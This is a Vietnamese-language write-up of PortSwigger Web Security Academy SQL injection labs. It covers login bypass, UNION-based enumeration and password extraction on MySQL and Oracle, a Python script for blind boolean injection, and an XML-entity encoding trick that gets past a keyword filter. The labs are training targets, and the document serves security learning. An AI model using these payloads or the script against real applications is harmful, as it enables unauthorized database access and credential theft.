<img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/6d1f6a74-d046-4136-a185-68dd872c0584" /># Write-up-All-labs-SQL-injection-PortSwigger


# Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<img width="1138" height="852" alt="image" src="https://github.com/user-attachments/assets/4e981c41-e3c1-4f0c-a021-de12a3947de4" />

Theo hint ở đầu bảo tồn tại lỗ hổng tấn công SQL injection trong bộ lọc danh mục sản phẩm. Khi chọn một danh mục thì câu truy vấn sẽ chạy là

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Ở đây mình chọn thử mục Pets

<img width="1468" height="942" alt="image" src="https://github.com/user-attachments/assets/0ea45432-ff60-4564-b5cf-78c9b93a7c08" />

Và `Pets` được sử dụng để truyền vào tham số `Category` ở trên thanh URL 

Thử sửa input truyền vào thành `Pets'or 1=1--` 

<img width="1491" height="819" alt="image" src="https://github.com/user-attachments/assets/a0a080f8-b777-40ba-a0b7-a91a7f471592" />

Chúng ta Solve được Challenge này 

# Lab 2: SQL injection vulnerability allowing login bypass

<img width="1132" height="682" alt="image" src="https://github.com/user-attachments/assets/ab65d35a-1013-43be-8157-85a23f8d6676" />

Chúng ta  SQL Injection ở chức năng đăng nhập để có thể log in với `username:administrator`

Thử với đăng nhập với `username:` `administrator'--` và password nhập gì cũng được

<img width="890" height="414" alt="image" src="https://github.com/user-attachments/assets/951ea563-cf22-4b8d-a65f-b5464941a41c" />

Và kết quả là:

<img width="1439" height="703" alt="image" src="https://github.com/user-attachments/assets/9a691600-9f28-4b25-b954-5f9290982e07" />

Chúng ta Solve được Challenge này 

# Lab 3: SQL injection attack, querying the database type and version on Oracle

<img width="1134" height="824" alt="image" src="https://github.com/user-attachments/assets/f2a93e3d-b4b8-4fdf-b09b-4c647ce8f7f1" />

Đề bài mô tả: tồn tại lỗ hổng trong bộ lọc danh mục sản phẩm, sử dụng UNION để khai thác lấy ra version database -> solved

Thử chọn mục Pets

<img width="1469" height="974" alt="image" src="https://github.com/user-attachments/assets/c5f2e908-09a1-49b9-a30e-200a0f45da0a" />

Đầu tiên xác định số lượng cột của câu SELECT phía trước bằng `ORDER BY` hoặc bằng cách thêm `SELECT NULL,NULL,NULL` cho đến khi vào server báo lỗi

<img width="1495" height="810" alt="image" src="https://github.com/user-attachments/assets/84835037-ce22-4690-bd28-fa9dfd090c47" />

<img width="1484" height="830" alt="image" src="https://github.com/user-attachments/assets/89ca87e9-fe2e-49dd-92d4-58e62984326e" />

Đến 3 nó lỗi , vậy số lượng cột ở đây là 2



<img width="1498" height="806" alt="image" src="https://github.com/user-attachments/assets/0a928411-3559-4cf9-9ba5-bd877122f064" />

Chúng ta Solve được Challenge này!

# Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

<img width="1138" height="816" alt="image" src="https://github.com/user-attachments/assets/52efe408-eee6-4201-950d-3295c34bd477" />

Chall này tương tự như Lab 3, chỉ đổi hệ quản trị cơ sở dữ liệu từ Oracle sang MySQL

<img width="1492" height="809" alt="image" src="https://github.com/user-attachments/assets/28598fe1-1089-4832-aa62-7794adff1785" />

Chúng ta Solve được Challenge này!


# Lab 5: SQL injection attack, listing the database contents on non-Oracle databases

<img width="1130" height="908" alt="image" src="https://github.com/user-attachments/assets/d58866a3-f791-4aa4-886c-d8ccbb4b2fa8" />

<img width="1496" height="540" alt="image" src="https://github.com/user-attachments/assets/3fbcb987-c158-4915-9bac-afe987ed9349" />

Chúng ta xác định được số cột bằng 2

<img width="1495" height="809" alt="image" src="https://github.com/user-attachments/assets/1d31661f-d52a-46b6-9e66-8e557c3e36b0" />

Lệnh lấy danh sách cơ sở dữ liệu trong MySQL:
```sql
SELECT schema_name FROM information_schema.schemata
```
Chúng ta thử truyền vào
```sql
'union SELECT schema_name,null FROM information_schema.schemata--
```
<img width="1485" height="812" alt="image" src="https://github.com/user-attachments/assets/df11bb73-3974-46e8-a7d3-bd6637438af3" />


Tiếp theo chúng ta cần xác định tên bảng

Lệnh lấy danh sách bảng có trong một cơ sở dữ liệu(MySQL):
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'tên_database'
```
Chúng ta thử truyền vào:
```sql
' union SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = 'public'--
```

<img width="1494" height="810" alt="image" src="https://github.com/user-attachments/assets/256dc107-b8c1-4b6d-a30c-459e16bc2670" />

Sau khi xác định được bảng thì cần xác định cột trong bảng đó:

Lệnh lấy danh sách cột có trong bảng(MySQL):
```sql
SELECT column_name FROM information_schema.columns WHERE table_schema = 'tên_database' AND table_name = 'tên_bảng';
```
Áp dụng:
```sql
' union SELECT column_name,NULL FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_yveauo'--
```

<img width="1492" height="807" alt="image" src="https://github.com/user-attachments/assets/e4190b85-b9eb-4bd1-837f-43c8927a9c6b" />

Cuối cùng truy cập vào cột  `password_skyupt` trong bảng `users_yveauo` để xem password thôi

```sql
' union select password_skyupt,null from users_yveauo--
```

<img width="1491" height="814" alt="image" src="https://github.com/user-attachments/assets/c547c721-5cfc-4846-82bb-29add2a4132a" />

Đăng nhập với username: `administrator`

<img width="920" height="502" alt="image" src="https://github.com/user-attachments/assets/00b06736-e682-4873-8a51-b326e4fd7283" />

Và chúng ta Solve được Challenge này!

<img width="1666" height="701" alt="image" src="https://github.com/user-attachments/assets/2776f54e-e21c-4b88-9834-d452828e6c09" />


# Lab 6: SQL injection attack, listing the database contents on Oracle

<img width="1136" height="909" alt="image" src="https://github.com/user-attachments/assets/16824154-28ec-4ac8-9357-2eff95d80fb7" />

Bài này tương tự với lab 5 nhưng chỉ đổi với hệ quản trị cơ sở dữ liệu ở đây là Oracle

Lưu ý: Thường Oracle = 1 database, bên trong có nhiều schema (users). Tức là mỗi khi user tạo tài khoản thì nó sẽ có những bảng riêng trong 1 database ấy chứ nó không sử dùng nhiều database như MySQL

Sơ đồ hình dung như thế này 
```
Database
 ├── Schema A (user A)
 │    ├── table1
 │    ├── table2
 │    └── view1
 ├── Schema B (user B)
 │    ├── users
 │    ├── orders
 │    └── logs
```
Cú pháp liệt kê bảng trong schema hiện tại của Oracle
```sql
SELECT table_name FROM user_tables;
```
Chúng ta nhập vào
```sql
' union select table_name,null from user_tables--
```
<img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/4b827f22-400b-4568-8816-b1abd86a0df8" />

Cú pháp liệt kê cột của bảng trong schema hiện tại
```sql
SELECT column_name, data_type
FROM user_tab_columns
WHERE table_name = 'USERS';
```
Chúng ta nhập vào 
```sql
' union select column_name,null from user_tab_columns where table_name = 'USERS_UQVEHQ' --
```
<img width="1484" height="759" alt="image" src="https://github.com/user-attachments/assets/de06516a-8da0-4e61-92e7-8c50f7c04662" />

Cuối cùng , đọc dữ liệu trong cột `PASSWORD_ICXLMV` của bảng `USERS_UQVEHQ`
```sql
' union select PASSWORD_ICXLMV,null from USERS_UQVEHQ --
```

<img width="1494" height="814" alt="image" src="https://github.com/user-attachments/assets/8500de96-cf0e-4fce-8584-e7337078bc2d" />

Dùng mật khẩu đó đăng nhập với username:`administrator`

<img width="1177" height="583" alt="image" src="https://github.com/user-attachments/assets/47fbc96d-bdf0-443f-aa86-72ed416876dd" />

Và chúng ta solve được Challenge này!

<img width="1492" height="709" alt="image" src="https://github.com/user-attachments/assets/6dfabc7e-b259-4877-982b-fffd9ea68fc7" />

# Lab 7: SQL injection UNION attack, determining the number of columns returned by the query

<img width="1126" height="631" alt="image" src="https://github.com/user-attachments/assets/489856b5-9d16-4db2-ad58-96b6167e7c72" />

Theo đề bài mô tả , để solved được thì phải sử dụng kĩ thuật `UNION SELECT NULL` để xác định số lượng cột của truy vấn `SELECT` trước đó

Chúng ta nhập vào 
```sql
' union select null,null,null--
```
<img width="1493" height="844" alt="image" src="https://github.com/user-attachments/assets/3183cadb-a536-4c78-a9e6-1d8f7ffe5c7a" />

Và chúng ta Solve được Challenge này!

# Lab 8: SQL injection UNION attack, finding a column containing text

<img width="1143" height="705" alt="image" src="https://github.com/user-attachments/assets/6b166406-39ae-47b6-9249-010a1d14110b" />

Theo mô tả của challenge này , chúng ta muốn Solve được phải xác định đúng kiểu dữ liệu chuỗi đang được cột nào ở câu Select trước đang sử dụng 

Trước tiên vẫn phải xác định số cột trước đã, bằng kỹ thuật đã học ở Lab 7

<img width="1481" height="819" alt="image" src="https://github.com/user-attachments/assets/48274c10-881c-4ba2-86dd-d1f85fb18c0c" />

Chúng ta truyền vào
```sql
' union select null,null,null--
```
Và xác định được số cột sử dụng trong câu Select trước là 3 cột

Tiếp theo dùng thử một ví dụ của cho kiểu dữ String , ở đây mình dùng `'a'` rồi thay lần lượt vào từng cột 

<img width="1488" height="627" alt="image" src="https://github.com/user-attachments/assets/5860d32a-d708-4ff0-9501-06b030c05f89" />


# Lab 9: SQL injection UNION attack, retrieving data from other tables

<img width="1139" height="575" alt="image" src="https://github.com/user-attachments/assets/931491d0-9f0e-4941-abf5-3e6347dcd27f" />


<img width="1494" height="824" alt="image" src="https://github.com/user-attachments/assets/8092f307-c18a-4f16-b607-118f46a9ec51" />

Chúng ta xác định được số cột được sử dụng trong câu truy vấn là 2 cột

<img width="1493" height="446" alt="image" src="https://github.com/user-attachments/assets/f5d18536-52c6-4675-b806-5ef3de0bccf2" />

Và không cột nào ở trong này sử dụng kiểu dữ liệu số cả

<img width="1489" height="817" alt="image" src="https://github.com/user-attachments/assets/53090737-4b6e-403d-9356-cbe412560a32" />

Chúng ta xác định được kiểu dữ liệu sử dụng trong cả 2 cột là kiểu String 

Cuối cùng , sử dụng truy vấn lấy username và password từ bảng users
```sql
' union select password,username from users--
```
<img width="1489" height="818" alt="image" src="https://github.com/user-attachments/assets/135ba7d2-c7c5-4b2a-8192-90e6ebdef3fe" />

```
username:administrator
password:69gxtydhkh0jzpj682pz
```
Sử dụng và đăng nhập thôi!

<img width="1438" height="706" alt="image" src="https://github.com/user-attachments/assets/afdaf133-25b1-4619-b183-13ec6e96d051" />

Chúng ta Solved được Challenge này!

# Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

<img width="1139" height="618" alt="image" src="https://github.com/user-attachments/assets/b2dacc27-79eb-48c7-8b35-b4086b361e14" />

Tương tự chúng ta cần xác định số cột 

<img width="1489" height="816" alt="image" src="https://github.com/user-attachments/assets/503c31ed-4147-4828-bc25-a4c62105a024" />

Và xác định được số cột sử dụng trong câu truy vấn là 2

Và kiểu dữ liệu được sử dụng là trong cột là: Cột 1 là kiểu số , Cột 2 là kiểu String

<img width="1490" height="814" alt="image" src="https://github.com/user-attachments/assets/1ab6caf5-dd6e-4fc9-a219-d65e78e3485a" />

Bởi vì cột 1 nó sẽ chỉ nhận kiểu dữ liệu số , cho nên chúng ta chỉ có thể truyền vào cột 2 là password thôi bởi vì cột 2 nó sẽ nhận kiểu dữ liệu String mà 

```sql
' union select 1,password from users--
```
<img width="1494" height="811" alt="image" src="https://github.com/user-attachments/assets/8fa99578-4430-42d5-ad0a-d0d6d5a0efd7" />

Và chúng ta nhận được 3 password , Lấy thử từng cái một với `username:administrator` là xong 

<img width="906" height="461" alt="image" src="https://github.com/user-attachments/assets/76282cf5-d292-4564-b77f-345073822d64" />

Và login thành công! , chúng ta Solved được Challenge này!!!

<img width="1177" height="653" alt="image" src="https://github.com/user-attachments/assets/e8be33db-da9c-4002-a4cc-b28a19841bbe" />

# Lab 11: Blind SQL injection with conditional responses

<img width="1127" height="858" alt="image" src="https://github.com/user-attachments/assets/88ecfd02-f4f7-4219-a9de-a985f2e47e44" />

Từ mô tả của đề bài , chúng ta biết được cái cookie được sử dụng trong Challenge này được xử lý bằng truy vấn SQL , và nếu Cookie có tồn tại hợp lệ thì web sẽ hiển thị một thông báo `Welcome back` 

Vào Challeng thì khi gửi request đầu tiên , ở response nó có gửi về Set-Cookie 

<img width="1496" height="432" alt="image" src="https://github.com/user-attachments/assets/53d7ff1c-1530-49f5-8f69-589687caff2d" />

Nhưng mà trong mỗi lần gửi request tiếp theo lại không có Header Cookie được thêm vào , vậy nên mình tự thêm 2 dòng Cookie kia vào request . 

Có nó mới có thể Injection được 

Theo hint của đề bài thì bạn cứ hiểu rằng , Chỉ cần cái truy vấn trả về dữ liệu thì web nó sẽ hiển thị thông báo `Welcome back!` 

Tương tự như các bài trên , chúng ta cần xác định số cột trước và xác định kiểu dữ liệu được sử dụng trong cột đó 
```sql
' union select 'a'--
```

<img width="1494" height="533" alt="image" src="https://github.com/user-attachments/assets/8992d8b1-aa67-4327-bb47-cf21064c9a17" />


Ở đây mình xác định được , câu truy vấn sử dụng duy nhất một cột , và kiểu dữ liệu được sử dụng trong cột là string, bởi vì web nó có hiển thị thông báo `Welcome back!` đó kìa.

Tiếp theo nhiệm vụ của chúng ta là xác định mật khẩu được sử dụng với `username: administrator` là gì? 

Bởi vì trang web nó không hiển thị bất kì dữ liệu trả về nào từ truy vấn , chúng ta chỉ có thể phân biệt được , nếu có dữ liệu trả về thì sẽ có thông báo `Welcome back` còn nếu không có dữ liệu trả về hoặc truy vấn lỗi thì nó sẽ không có thông báo đó

Trước tiên cần xác định độ dài password bằng payload
```sql
' or length((select password from users where username = 'administrator')) < 25 --
```
<img width="1500" height="437" alt="image" src="https://github.com/user-attachments/assets/61baebd6-5fa8-4bda-83d8-972895eb4688" />

Nó có hiển thị welcome back tức là độ dài password nhỏ hơn 25 , mình tiếp tục đoán bằng payload sau:
```sql
' or length((select password from users where username = 'administrator')) = 20 --
```

<img width="1487" height="481" alt="image" src="https://github.com/user-attachments/assets/3bd9397d-4cbb-4e16-adbe-ac6a9b5f3744" />

Vậy lúc này đã rõ độ dài password là 20 ký tự 

Tiếp theo sử dụng hàm `substring()` để xác định kí tự từng vị trí bằng payload sau:
```
' or substring((select password from users where username = 'administrator'),1,1) >  'a'--
```

Vậy là nó hoàn toàn hoạt động đúng , và bây giờ sử dụng payload
```sql
' or substring((select password from users where username = 'administrator'),1,1) =  'a'--
```
Add to instruder , rồi add 2 kí tự `a` và `1` và điều chỉnh setting như thế này

<img width="1920" height="564" alt="image" src="https://github.com/user-attachments/assets/5d5fc406-2faa-4ddb-915e-3dad8dec98c1" />

Và 

<img width="1920" height="501" alt="image" src="https://github.com/user-attachments/assets/7d0995e9-6c8f-4e73-aee4-c5d0e08e9286" />

Chọn Cluster Bomb attack và Start Attack

Và bạn nhận được kết quả như thế này , sử dụng độ dài response trả về làm thứ để xác định 

<img width="1830" height="334" alt="image" src="https://github.com/user-attachments/assets/9352e9b6-a632-4fd4-891f-4db95cdcca9b" />

Chúng ta được password: `347szh05698lrtunn0xu`

Hoặc ở đây bạn có thể tự viết script python như thế này
```python
import requests
import re

url ="https://0aaa00fd03a1fabb8261760b008e00eb.web-security-academy.net/filter?category=Gifts"

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"

cookies = {'TrackingId':'fknK8gOwIEOgCAei','session':'OMQAtNF9W0esea1xaaqjJnN0fOeAsyQX'}

secret =""
for i in range(1,21,1):
	for j in alphabet:
		sql =f"substring((select password from users where username = 'administrator'),{i},1) =  '{j}'"

		payload = f"' or {sql} --"

		cookies["TrackingId"] = payload

		res = requests.get(url,cookies=cookies)

		result = re.search("Welcome back!",res.text)

		if result:
			secret = secret +j
			break

print( secret )
```
Và kết quả cũng được tương tự 

<img width="237" height="65" alt="image" src="https://github.com/user-attachments/assets/cc1fc9bd-16bc-4bae-ba0f-e138bd14730a" />


Và chúng ta solved được Challenge này!!

<img width="1478" height="540" alt="image" src="https://github.com/user-attachments/assets/7a74682d-6d3e-42f7-ae01-0d452acf1f9e" />


# Lab 16: SQL injection with filter bypass via XML encoding

<img width="1129" height="516" alt="image" src="https://github.com/user-attachments/assets/5eb0bf29-eb48-4b86-8c19-ab2da9d3a5d6" />

Theo mô tả của challenge thì tồn tại một lỗ hổng SQLi ở trong mục kiểm tra tồn kho , chức năng này sử dụng truy vấn SQL để trả về kết quả và in ra màn hình web

<img width="1448" height="461" alt="image" src="https://github.com/user-attachments/assets/4b031990-772c-4681-ae3f-611a2486512b" />

Đây chính là nó , cái kiểm tra tồn kho

Chúng ta bắt thử request của nó 

<img width="1491" height="657" alt="image" src="https://github.com/user-attachments/assets/74656513-480e-4014-b52f-e05e90ef2971" />


Lưu ý ở đây: cái chức năng check tồn kho nó gửi thông tin đến `<storeId>` 

Và một cái nữa chính là vì ở đây storeId là số chứ không phải string nên chúng ta không cần dùng dấu nháy để đóng mà ghi tiếp câu lệnh cần phía sau luôn 

Mình thử xác định số cột nhưng bất kể như nào nó cũng báo `Attack detected` , vậy tức là ở đây nó có WAF các chữ nguy hiểm như UNION , SELECT ,....

Mình có thử nghĩ cách bypass = hex nhưng mà mới nhớ SQL nó chỉ hex được cái dữ liệu chứ không hex được hoàn toàn câu lệnh 

Giả sử 
```sql
0x53454C454354 * FROM users
```
MySQL nó không thể hiểu `0x53454C454354` là Select 

Nhưng Ở đây có 2 engine riêng để xử lý từng ngôn ngữ riêng , theo bài thì có sử dụng cả XML thì tất nhiên cũng phải có XML engine riêng để xử lý dữ liệu được viết bằng ngôn ngữ của nó

Và trên hết , XML engine nó có thể dịch được những mã hex đó , giả sử 0x65 thì MySQL có thể hiểu đó là chữ A , thì &#65; thì XML có thể hiểu đó chữ A , và quan trọng là nó dịch hết , không kể đó là Lệnh hay Dữ liệu gì cả. Chỉ cần thêm tiền tố `&#` ở đầu mã hex và dấu `;` ở cuối mã hex 

Lúc này chúng ta cần
```sql
union select username from users--
```
chuyển thành 
```
&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;
```
và kết quả là tìm thấy được administrator
<img width="1490" height="764" alt="image" src="https://github.com/user-attachments/assets/de780680-0a51-4d54-9b0e-acc7aa324280" />

payload cuối cùng để lấy password của administrator
```
union select password from users where username = 'administrator'--
```
Chúng ta được password 

<img width="1497" height="819" alt="image" src="https://github.com/user-attachments/assets/747f68be-111a-4e70-a716-98b9af4894f8" />

Lấy nó và Login thôi !

<img width="1484" height="713" alt="image" src="https://github.com/user-attachments/assets/d1bdcdf7-30dc-4102-aaf7-e6b3a463b173" />

Chúng ta Solved được Challenge này!
